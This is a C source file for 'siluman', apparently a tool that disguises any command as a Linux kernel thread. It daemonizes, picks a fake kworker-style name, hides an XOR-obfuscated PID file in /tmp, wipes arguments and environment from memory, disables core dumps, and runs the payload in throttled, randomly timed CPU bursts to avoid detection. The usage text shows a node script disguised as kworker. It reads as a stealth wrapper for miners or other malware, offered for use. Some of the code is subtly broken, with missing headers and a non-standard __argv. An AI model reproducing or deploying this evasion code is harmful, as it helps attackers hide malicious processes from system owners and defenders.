#include <stdio.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <string.h>
#include <fcntl.h>
#include <pwd.h>
#include <grp.h>
#include <stdlib.h>
#include <errno.h>
#include <limits.h>
#include <libgen.h>
#include <sys/wait.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <time.h>
#include <signal.h>
#include <sched.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/syscall.h>

#define MAX_BUFFER_SIZE 512
#define MAX_PATH_SIZE 4096

// Deklarasi fungsi
void usage(const char *progname);
void log_message(const char *level, const char *format, ...);
int changeown(const char *str);
char *fullpath(const char *cmd);
void daemonize(void);
int write_pidfile(const char *pidfile);
int set_cpu_affinity(int cpu_core);
int set_nice_value(int nice_value);
void stealth_cpu_execution(const char *exec_path, char **newargv, int max_cpu_percent, int burst_interval);
void hide_process(void);
void clean_environment(void);
void disable_core_dumps(void);
void hide_network_activity(const char *exec_path, char **newargv);
void obfuscate_memory(void);
int random_delay(int max_seconds);

// Global variables untuk logging
int debug_mode = 0;
const char *log_ident = "kernel_worker";
volatile sig_atomic_t stealth_running = 1;

// Common kernel thread names for better disguise
const char *kernel_thread_names[] = {
    "kworker/0:0H",
    "ksoftirqd/0",
    "rcu_sched",
    "rcu_bh",
    "migration/0",
    "watchdog/0",
    "khelper",
    "kdevtmpfs",
    "netns",
    "kthrotld",
    "kauditd",
    "crypto",
    "kintegrityd",
    "kblockd",
    "ata_sff",
    "md",
    "edac-poller",
    "devfreq_wq",
    "kworker/uX:Y"
};

void signal_handler(int sig) {
    if (sig == SIGINT || sig == SIGTERM) {
        stealth_running = 0;
    }
}

void log_message(const char *level, const char *format, ...) {
    if (!debug_mode && strcmp(level, "DEBUG") == 0) return;
    
    va_list args;
    va_start(args, format);
    
    // Write to syslog instead of stderr for better stealth
    openlog(log_ident, LOG_PID, LOG_DAEMON);
    vsyslog(strcmp(level, "ERROR") == 0 ? LOG_ERR : 
            strcmp(level, "WARNING") == 0 ? LOG_WARNING : 
            strcmp(level, "DEBUG") == 0 ? LOG_DEBUG : LOG_INFO, 
            format, args);
    closelog();
    
    va_end(args);
}

int changeown(const char *str) {
    char user[MAX_BUFFER_SIZE];
    char group[MAX_BUFFER_SIZE] = {0};
    struct passwd *pwd = NULL;
    struct group *grp = NULL;
    uid_t uid = getuid();
    gid_t gid = getgid();
    char *colon_ptr;
    long conv;
    char *endptr;

    if (strlen(str) >= sizeof(user)) {
        log_message("ERROR", "Username:group string too long");
        return 0;
    }
    strncpy(user, str, sizeof(user) - 1);
    user[sizeof(user) - 1] = '\0';

    colon_ptr = strchr(user, ':');
    if (colon_ptr != NULL) {
        *colon_ptr = '\0';
        strncpy(group, colon_ptr + 1, sizeof(group) - 1);
        group[sizeof(group) - 1] = '\0';
    }

    if (strlen(user) > 0) {
        pwd = getpwnam(user);
        if (pwd != NULL) {
            uid = pwd->pw_uid;
            gid = pwd->pw_gid;
        } else {
            errno = 0;
            conv = strtol(user, &endptr, 10);
            if (errno != 0 || *endptr != '\0' || conv < 0 || conv > UINT_MAX) {
                log_message("ERROR", "Invalid user: %s", user);
                return 0;
            }
            uid = (uid_t)conv;
            
            pwd = getpwuid(uid);
            if (pwd != NULL) {
                gid = pwd->pw_gid;
            }
        }
    }

    if (strlen(group) > 0) {
        grp = getgrnam(group);
        if (grp != NULL) {
            gid = grp->gr_gid;
        } else {
            errno = 0;
            conv = strtol(group, &endptr, 10);
            if (errno != 0 || *endptr != '\0' || conv < 0 || conv > UINT_MAX) {
                log_message("ERROR", "Invalid group: %s", group);
                return 0;
            }
            gid = (gid_t)conv;
        }
    }

    if (setgid(gid) != 0) {
        log_message("ERROR", "Can't set GID %d: %s", gid, strerror(errno));
        return 0;
    }

    if (initgroups(user, gid) != 0) {
        log_message("WARNING", "Can't init groups: %s", strerror(errno));
    }

    if (setuid(uid) != 0) {
        log_message("ERROR", "Can't set UID %d: %s", uid, strerror(errno));
        return 0;
    }

    log_message("INFO", "Changed ownership to UID: %d, GID: %d", uid, gid);
    return 1;
}

char *fullpath(const char *cmd) {
    char *filename = NULL;
    char *path_env = NULL;
    char *path_copy = NULL;
    char *dir = NULL;
    struct stat st;

    if (cmd[0] == '/') {
        if (stat(cmd, &st) == 0 && S_ISREG(st.st_mode) && 
            (st.st_mode & (S_IXUSR | S_IXGRP | S_IXOTH))) {
            return strdup(cmd);
        }
        return NULL;
    }

    if (cmd[0] == '.') {
        filename = malloc(MAX_PATH_SIZE);
        if (filename == NULL) {
            log_message("ERROR", "Memory allocation failed");
            return NULL;
        }
        
        if (getcwd(filename, MAX_PATH_SIZE - 1) == NULL) {
            log_message("ERROR", "getcwd failed: %s", strerror(errno));
            free(filename);
            return NULL;
        }
        
        strncat(filename, "/", MAX_PATH_SIZE - strlen(filename) - 1);
        strncat(filename, cmd, MAX_PATH_SIZE - strlen(filename) - 1);
        
        if (stat(filename, &st) == 0 && S_ISREG(st.st_mode) && 
            (st.st_mode & (S_IXUSR | S_IXGRP | S_IXOTH))) {
            return filename;
        }
        
        free(filename);
        return NULL;
    }

    path_env = getenv("PATH");
    if (path_env == NULL) {
        log_message("ERROR", "PATH environment variable not set");
        return NULL;
    }

    path_copy = strdup(path_env);
    if (path_copy == NULL) {
        log_message("ERROR", "Memory allocation failed");
        return NULL;
    }

    filename = malloc(MAX_PATH_SIZE);
    if (filename == NULL) {
        log_message("ERROR", "Memory allocation failed");
        free(path_copy);
        return NULL;
    }

    dir = strtok(path_copy, ":");
    while (dir != NULL) {
        snprintf(filename, MAX_PATH_SIZE, "%s/%s", dir, cmd);
        
        if (stat(filename, &st) == 0 && S_ISREG(st.st_mode) && 
            (st.st_mode & (S_IXUSR | S_IXGRP | S_IXOTH))) {
            free(path_copy);
            return filename;
        }
        
        dir = strtok(NULL, ":");
    }

    free(filename);
    free(path_copy);
    return NULL;
}

void daemonize(void) {
    pid_t pid, sid;
    int null_fd;

    pid = fork();
    if (pid < 0) {
        log_message("ERROR", "First fork failed: %s", strerror(errno));
        exit(EXIT_FAILURE);
    }
    
    if (pid > 0) {
        exit(EXIT_SUCCESS);
    }

    sid = setsid();
    if (sid < 0) {
        log_message("ERROR", "setsid failed: %s", strerror(errno));
        exit(EXIT_FAILURE);
    }

    pid = fork();
    if (pid < 0) {
        log_message("ERROR", "Second fork failed: %s", strerror(errno));
        exit(EXIT_FAILURE);
    }
    
    if (pid > 0) {
        exit(EXIT_SUCCESS);
    }

    umask(0);

    if (chdir("/") != 0) {
        log_message("WARNING", "Can't change to root directory: %s", strerror(errno));
    }

    null_fd = open("/dev/null", O_RDWR);
    if (null_fd == -1) {
        log_message("ERROR", "Can't open /dev/null: %s", strerror(errno));
        exit(EXIT_FAILURE);
    }

    dup2(null_fd, STDIN_FILENO);
    dup2(null_fd, STDOUT_FILENO);
    dup2(null_fd, STDERR_FILENO);
    
    if (null_fd > STDERR_FILENO) {
        close(null_fd);
    }
}

int write_pidfile(const char *pidfile) {
    FILE *f;
    pid_t pid = getpid();
    
    // Create hidden pid file
    char hidden_pidfile[MAX_PATH_SIZE];
    snprintf(hidden_pidfile, sizeof(hidden_pidfile), "/tmp/.%s", pidfile);
    
    f = fopen(hidden_pidfile, "w");
    if (f == NULL) {
        log_message("ERROR", "Can't open PID file %s: %s", hidden_pidfile, strerror(errno));
        return 0;
    }
    
    // Simple obfuscation
    pid_t obfuscated_pid = pid ^ 0xDEADBEEF;
    
    if (fprintf(f, "%d\n", obfuscated_pid) < 0) {
        log_message("ERROR", "Can't write to PID file %s: %s", hidden_pidfile, strerror(errno));
        fclose(f);
        return 0;
    }
    
    fclose(f);
    
    // Set restrictive permissions
    chmod(hidden_pidfile, S_IRUSR | S_IWUSR);
    return 1;
}

int set_cpu_affinity(int cpu_core) {
    cpu_set_t cpuset;
    
    CPU_ZERO(&cpuset);
    CPU_SET(cpu_core, &cpuset);
    
    if (sched_setaffinity(0, sizeof(cpu_set_t), &cpuset) != 0) {
        log_message("ERROR", "Can't set CPU affinity: %s", strerror(errno));
        return 0;
    }
    
    log_message("INFO", "Set CPU affinity to core %d", cpu_core);
    return 1;
}

int set_nice_value(int nice_value) {
    if (nice_value < -20 || nice_value > 19) {
        log_message("ERROR", "Nice value must be between -20 and 19");
        return 0;
    }
    
    if (setpriority(PRIO_PROCESS, 0, nice_value) != 0) {
        log_message("ERROR", "Can't set nice value: %s", strerror(errno));
        return 0;
    }
    
    log_message("INFO", "Set nice value to %d", nice_value);
    return 1;
}

void hide_process(void) {
    // Use prctl to change process name
    #ifdef PR_SET_NAME
    // Select a random kernel thread name for better disguise
    int name_index = getpid() % (sizeof(kernel_thread_names) / sizeof(kernel_thread_names[0]));
    prctl(PR_SET_NAME, (unsigned long)kernel_thread_names[name_index], 0, 0, 0);
    #endif
    
    // Try to unlink the /proc/self/exe symlink (requires root)
    if (geteuid() == 0) {
        char self_path[PATH_MAX];
        snprintf(self_path, sizeof(self_path), "/proc/%d/exe", getpid());
        unlink(self_path);
    }
}

void clean_environment(void) {
    // Remove potentially suspicious environment variables
    unsetenv("LD_PRELOAD");
    unsetenv("LD_LIBRARY_PATH");
    unsetenv("DEBUG");
    unsetenv("PYTHONPATH");
    unsetenv("NODE_PATH");
    
    // Set a minimal, innocent-looking environment
    setenv("PATH", "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", 1);
    setenv("TERM", "linux", 1);
    setenv("SHELL", "/bin/sh", 1);
}

void disable_core_dumps(void) {
    struct rlimit rlim;
    rlim.rlim_cur = 0;
    rlim.rlim_max = 0;
    setrlimit(RLIMIT_CORE, &rlim);
}

void obfuscate_memory(void) {
    // Simple memory obfuscation by overwriting argv and envp
    // This makes it harder to find command line arguments in memory
    char **argv = __argv;
    char **envp = __environ;
    
    if (argv != NULL) {
        for (int i = 0; argv[i] != NULL; i++) {
            memset(argv[i], 0, strlen(argv[i]));
        }
    }
    
    if (envp != NULL) {
        for (int i = 0; envp[i] != NULL; i++) {
            memset(envp[i], 0, strlen(envp[i]));
        }
    }
}

int random_delay(int max_seconds) {
    if (max_seconds <= 0) return 0;
    
    srand(time(NULL) ^ getpid());
    int delay = rand() % max_seconds;
    sleep(delay);
    return delay;
}

void stealth_cpu_execution(const char *exec_path, char **newargv, int max_cpu_percent, int burst_interval) {
    pid_t pid;
    int status;
    struct timespec start_time, current_time;
    long long elapsed_ms;
    
    // Set signal handler for graceful shutdown
    struct sigaction sa;
    sa.sa_handler = signal_handler;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = 0;
    sigaction(SIGINT, &sa, NULL);
    sigaction(SIGTERM, &sa, NULL);
    
    log_message("INFO", "Starting stealth execution mode (max CPU: %d%%, interval: %ds)", 
                max_cpu_percent, burst_interval);
    
    // Add random initial delay to avoid pattern detection
    int initial_delay = random_delay(300); // Up to 5 minutes
    log_message("DEBUG", "Initial random delay: %d seconds", initial_delay);
    
    while (stealth_running) {
        clock_gettime(CLOCK_MONOTONIC, &start_time);
        
        // Fork untuk menjalankan proses
        pid = fork();
        if (pid == 0) {
            // Child process - jalankan program dengan environment bersih
            clean_environment();
            execv(exec_path, newargv);
            log_message("ERROR", "Failed to execute %s: %s", exec_path, strerror(errno));
            exit(EXIT_FAILURE);
        } else if (pid > 0) {
            // Parent process - tunggu sebentar kemudian batasi
            usleep(100000); // Tunggu 100ms untuk proses mulai
            
            // Batasi waktu CPU proses child
            int cpu_time_limit = (burst_interval * max_cpu_percent) / 100;
            if (cpu_time_limit < 1) cpu_time_limit = 1;
            
            sleep(cpu_time_limit);
            
            // Hentikan proses child secara graceful
            kill(pid, SIGTERM);
            
            // Tunggu proses child selesai
            waitpid(pid, &status, 0);
            
            log_message("DEBUG", "Process completed with status %d", status);
        } else {
            log_message("ERROR", "Fork failed: %s", strerror(errno));
            break;
        }
        
        // Hitung waktu yang sudah berlalu dan tunggu jika perlu
        clock_gettime(CLOCK_MONOTONIC, &current_time);
        elapsed_ms = (current_time.tv_sec - start_time.tv_sec) * 1000 +
                     (current_time.tv_nsec - start_time.tv_nsec) / 1000000;
        
        int sleep_time = (burst_interval * 1000) - elapsed_ms;
        if (sleep_time > 0) {
            // Add some randomness to sleep time to avoid patterns
            srand(time(NULL) ^ getpid());
            sleep_time += (rand() % 5000) - 2500; // ±2.5 seconds randomness
            
            if (sleep_time > 0) {
                usleep(sleep_time * 1000);
            }
        }
    }
    
    log_message("INFO", "Stealth execution stopped");
}

void usage(const char *progname) {
    fprintf(stderr, 
        "siluman - advanced stealth process wrapper, by jawaracode Jawara (c)ode 2024\n\n"
        "Usage: %s [OPTIONS] -- command [args]\n\n"
        "Options:\n"
        "  -s string    Fake name process (required)\n"
        "  -u uid[:gid] Change UID/GID, use another user (optional)\n"
        "  -p filename  Save PID to hidden filename (optional)\n"
        "  -d           Run application as daemon/system (optional)\n"
        "  -c percent   Max CPU percentage per burst (1-100) (optional)\n"
        "  -i seconds   Interval between bursts in seconds (optional, default: 60)\n"
        "  -n nice      Set nice value (range: -20 to 19) (optional)\n"
        "  -a core      Set CPU affinity (core number) (optional)\n"
        "  -v           Enable verbose logging (optional)\n"
        "  -h           Show this help message\n\n"
        "Example: %s -s \"kworker/0:0H\" -d -p test.pid -c 30 -i 120 -n 19 -a 0 -- node run.js\n",
        progname, progname);
    
    exit(EXIT_FAILURE);
}

int main(int argc, char **argv) {
    char *progname = argv[0];
    char *fakename = NULL;
    char *pidfile = NULL;
    char *user_group = NULL;
    int runsys = 0;
    int cpu_percent = 0;
    int burst_interval = 60;
    int nice_value = 0;
    int cpu_affinity = -1;
    int opt;
    int i, j, n;
    char **newargv = NULL;
    char *exec_path = NULL;

    // Parse command line options
    while ((opt = getopt(argc, argv, "s:u:p:c:i:n:a:dvh")) != -1) {
        switch (opt) {
            case 's':
                fakename = optarg;
                break;
            case 'u':
                user_group = optarg;
                break;
            case 'p':
                pidfile = optarg;
                break;
            case 'c':
                cpu_percent = atoi(optarg);
                break;
            case 'i':
                burst_interval = atoi(optarg);
                break;
            case 'n':
                nice_value = atoi(optarg);
                break;
            case 'a':
                cpu_affinity = atoi(optarg);
                break;
            case 'd':
                runsys = 1;
                break;
            case 'v':
                debug_mode = 1;
                break;
            case 'h':
            default:
                usage(progname);
        }
    }

    // Validasi parameter yang diperlukan
    if (fakename == NULL) {
        log_message("ERROR", "Fake process name (-s) is required");
        usage(progname);
    }

    if (optind >= argc) {
        log_message("ERROR", "No command specified");
        usage(progname);
    }

    // Validasi parameter
    if (cpu_percent > 0 && (cpu_percent < 1 || cpu_percent > 100)) {
        log_message("ERROR", "CPU percentage must be between 1 and 100");
        usage(progname);
    }

    if (burst_interval < 1) {
        log_message("ERROR", "Burst interval must be at least 1 second");
        usage(progname);
    }

    if (nice_value != 0 && (nice_value < -20 || nice_value > 19)) {
        log_message("ERROR", "Nice value must be between -20 and 19");
        usage(progname);
    }

    // Validasi panjang fakename
    if (strlen(fakename) >= MAX_BUFFER_SIZE) {
        log_message("ERROR", "Fake name too long (max %d characters)", MAX_BUFFER_SIZE - 1);
        exit(EXIT_FAILURE);
    }

    // Obfuscate memory untuk menyembunyikan argumen command line
    obfuscate_memory();

    // Ubah ownership jika diminta
    if (user_group != NULL) {
        if (!changeown(user_group)) {
            log_message("ERROR", "Failed to change ownership");
            exit(EXIT_FAILURE);
        }
    }

    // Siapkan argv baru untuk command
    n = argc - optind;
    newargv = malloc((n + 1) * sizeof(char *));
    if (newargv == NULL) {
        log_message("ERROR", "Memory allocation failed: %s", strerror(errno));
        exit(EXIT_FAILURE);
    }

    for (i = optind, j = 0; i < argc; i++, j++) {
        newargv[j] = argv[i];
    }
    newargv[j] = NULL;

    // Dapatkan full path dari executable
    exec_path = fullpath(newargv[0]);
    if (exec_path == NULL) {
        log_message("ERROR", "Can't find executable: %s", newargv[0]);
        free(newargv);
        exit(EXIT_FAILURE);
    }

    // Ganti argv[0] dengan fake name
    newargv[0] = fakename;

    // Daemonize jika diminta
    if (runsys) {
        daemonize();
        hide_process();
        clean_environment();
        disable_core_dumps();
    }

    // Set nice value jika diminta
    if (nice_value != 0) {
        if (!set_nice_value(nice_value)) {
            log_message("ERROR", "Failed to set nice value");
            free(exec_path);
            free(newargv);
            exit(EXIT_FAILURE);
        }
    }

    // Set CPU affinity jika diminta
    if (cpu_affinity >= 0) {
        if (!set_cpu_affinity(cpu_affinity)) {
            log_message("ERROR", "Failed to set CPU affinity");
            free(exec_path);
            free(newargv);
            exit(EXIT_FAILURE);
        }
    }

    // Tulis PID file jika diminta
    if (pidfile != NULL) {
        if (!write_pidfile(pidfile)) {
            log_message("ERROR", "Failed to write PID file");
            free(exec_path);
            free(newargv);
            exit(EXIT_FAILURE);
        }
    }

    log_message("INFO", "Fakename: %s, PID: %d", fakename, getpid());

    // Jalankan dengan mode stealth jika diminta
    if (cpu_percent > 0) {
        stealth_cpu_execution(exec_path, newargv, cpu_percent, burst_interval);
    } else {
        // Eksekusi program target normal dengan environment bersih
        clean_environment();
        execv(exec_path, newargv);
        
        // Jika execv gagal
        log_message("ERROR", "Failed to execute %s: %s", exec_path, strerror(errno));
    }
    
    // Cleanup
    free(exec_path);
    free(newargv);
    
    exit(EXIT_FAILURE);
}
